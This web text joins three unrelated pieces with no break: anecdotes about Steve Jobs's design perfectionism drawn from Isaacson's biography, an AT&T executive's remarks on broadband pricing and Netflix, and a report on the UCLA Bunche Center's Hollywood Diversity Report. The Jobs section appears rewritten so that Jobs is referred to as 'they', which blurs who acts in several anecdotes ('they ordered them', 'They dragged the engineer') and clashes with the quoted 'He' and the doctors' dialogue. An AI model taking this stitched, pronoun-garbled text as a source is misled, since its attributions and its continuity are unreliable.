An engineer said to him, "The only thing that matters is how well it works. Nobody is going to see the PC board." Jobs response according to Isaacson: ""I want it to be as beautiful as possible, even if it's inside the box. A great carpenter isn't going to use lousy wood for the back of a cabinet, even though nobody's going to see it."
They wanted the exact right shade of beige for the Apple II
Apple's manufacturing partner had 2,000 shades of beige. None of them were good enough. So they came up with their own.
They customized the interior of their private plane and drove the designer crazy
It took them over a year to design the interior of their Gulfstream jet. The reason? They insisted that there were no buttons that toggled. They also hated stainless steel buttons, so they had them replaced with brushed metal buttons.
They insisted the original Mac make rounded rectangles
One of Apple's Mac engineers busted their butt to make the computer do oval and circle illustrations. Everyone in the Mac group was proud. Not Jobs. All they could say was, "Well, circles and ovals are good, but how about drawing rectangles with rounded corners?" The engineer said, "I wanted to keep the graphics routines lean and limit them to the primitives that truly needed to be done."
Jobs flipped out. They said rectangles with round corners were everywhere. They dragged the engineer out of Apple's office and took them for a walk pointing out 17 examples of rectangles with round corners within three blocks.
The floors in Apple stores are made of stone from a quarry outside of Florence
Here's how much detail Jobs put into the floor of Apple stores:
In 1985, as they were being ousted from their first tour at Apple, they had visited Italy and been impressed by the gray stone of Florence's sidewalks. In 2002, when they came to the conclusion that the light wood floors in the stores were beginning to look somewhat pedestrian-a concern that it's hard to imagine bedeviling someone like Microsoft CEO Steve Ballmer-Jobs wanted to use that stone instead. Some of their colleagues pushed to replicate the color and texture using concrete, which would have been ten times cheaper, but Jobs insisted that it had to be authentic. The gray-blue Pietra Serena sandstone, which has a fine-grained texture, comes from a family-owned quarry, Il Casone, in Firenzuola outside of Florence. "We select only 3% of what comes out of the mountain, because it has to have the right shading and veining and purity," said Johnson. "Steve felt very strongly that we had to get the color right and it had to be a material with high integrity." So designers in Florence picked out just the right quarried stone, oversaw cutting it into the proper tiles, and made sure each tile was marked with a sticker to ensure that it was laid out next to its companion tiles. "Knowing that it's the same stone that Florence uses for its sidewalks assures you that it can stand the test of time," said Johnson.
They put similar attention to detail on Pixar's HQ
The building's steel beams were going to be exposed, so Isaacson says Jobs look at samples of beams from around the country. They picked beams from Arkansas, and made sure the steel was blasted to its pure color. Then they made sure the truckers didn't leave any marks on the beams. They also insisted the beams were bolted together, not welded, and then clear coated.
When they were hospitalized they rejected masks because they were ugly
We're not sure if they were delirious, or what here, but this is taking things too far:
Even when they were barely conscious, their strong personality came through. At one point the pulmonologist tried to put a mask over their face when they were deeply sedated. Jobs ripped it off and mumbled that they hated the design and refused to wear it. Though barely able to speak, they ordered them to bring five different options for the mask and they would pick a design they liked. The doctors looked at Powell, puzzled. They were finally able to distract them so they could put on the mask. They also hated the oxygen monitor they put on their finger. They told them it was ugly and too complex. They suggested ways it could be designed more simply. "He was very attuned to every nuance of the environment and objects around him, and that drained him," Powell recalled.

Sprint chairperson Masayoshi Son has argued that American consumers are paying way too much for broadband. AT&T disagrees.
AT&T's wireless chief insisted on Tuesday that consumers are getting a good deal, especially when you consider that America has the broadest LTE network in the world.
Meanwhile, the cost for a megabyte of data has gone down 93 percent since 2008, said Ralph de la Vega, speaking at the Rutberg Global Summit in Atlanta.
“I think it shows that the U.S. is healthy,” de la Vega said. “Investments are being made. Networks are being built.”
De la Vega also addressed AT&T's contention that Netflix should have to pay carriers for some of the costs associated with delivering their service.
“We have to provide additional capacity,” de la Vega said. “That everybody knows. The only question is — who pays for that addition?”
While customers pay for the data they use, especially in wireless, de la Vega said that the backbone should be paid for by companies — like Netflix — that are driving demand.
De la Vega said the company hasn't necessarily given up the notion of expanding into Europe.
“We haven't decided on Europe,” de la Vega said.
Darnell Hunt, director of the UCLA Bunche Center, discusses findings of the center's third annual report.
“The Oscar nominations are out, and they're so white, a grand jury has decided not to indict them.”
With that pointed joke lampooning the 2015 Academy Award nominations, comedian Larry Wilmore launched their political satire series, “The Nightly Show,” last January. That line was equally applicable to the demographics of Hollywood writing staffs, executive suites and talent agencies — and is just as relevant one year later.
The Ralph J. Bunche Center for African American Studies has published its third annual Hollywood Diversity Report. The comprehensive study, subtitled “Busine$$ as Usual?,” examines the relationships between diversity and profitability in Hollywood, and finds once again that audiences, regardless of their race, prefer diverse content. It also reports that films and television shows with diverse casts tend to sell more tickets and earn higher ratings.
“What we've found for three years running now is that audiences prefer content that looks like America,” said Darnell Hunt, lead author of the study, a UCLA professor of sociology and director of the Bunche Center.
The trend of higher ratings and earnings for more diverse content is reinforced by consumers' online behavior. According to the report, social media engagement, an increasingly important measure of popularity, was higher for more diverse programming. For example, the study found that among broadcast TV shows, the median number of Twitter posts was highest for programs with casts that were made up of 31 percent to 40 percent minority actors.
Despite the economic advantages enjoyed by programming with diverse casts — and the celebrated success of a few breakout figures — film and TV jobs still go overwhelmingly to white male performers and filmmakers, while women and people of color are denied opportunities to advance in the industry. Racial minorities, for instance, had 12.9 percent of the lead roles in the 163 films examined for 2014, despite making up almost 40 percent of the nation's population.
During that same period, women directed just 4.3 percent of the top films, according to the report, down from 6.3 percent in 2013.
“While minorities fell back a few steps since the last report in six of the 11 industry employment arenas examined and merely held their ground in the other four, women suffered losses in eight of the 11 arenas examined and treaded water in the other three,” the report notes. “Both groups remained underrepresented on every industry employment front in 2013–14.”
The lack of diversity among 2016 Academy Award nominees — for the second consecutive year, all of the men and women nominated in the actor and supporting actor categories are white — led to a public backlash and the #OscarsSoWhite social media campaign, which decried the ongoing inequality in Hollywood. But beyond the immediate controversy, the demographic mismatch between Hollywood and the nation could portend serious economic consequences for the industry.
The report suggests that the entertainment industry's current business model may soon be unsustainable. According to the study: “At nearly 40 percent of the nation's population and growing, people of color are overrepresented among Hollywood's audiences. … Similarly, viewer ratings and social media engagement demonstrate that people of color now make up arguably the most important segment of the television audience.” However, the report notes, “The very people best situated to help [Hollywood] connect with today's (and tomorrow's) audiences are hardly at the table.”
The researchers write that while Academy Award nominations generated headlines and attention, they merely hint at systemic problems that reach every sector of the industry — the networks and studios, agencies, film and television academies, individual producers and showrunners — and that the situation won't be addressed with quick fixes. “It will require bold gestures that disrupt industry business as usual, which not only adjust the optics in front of the camera but that also overhaul the creative and executive machinery behind it.”
Hunt said those types of changes are necessary because of the entertainment industry's singular influence on our culture.
“We know from data that when groups don't know a lot about each other, much of what they think they know comes from entertainment,” Hunt said. “So to the extent that whole populations are absent in media or are placed exclusively in stereotypical roles, you tend to normalize certain types of hierarchical structures that are already in place in society and reinforce prejudices.
“The way we make sense of who we are, who we aren't and who we ought to be often comes from the stories we tell and the stories we consume. This is why what we watch is important.”
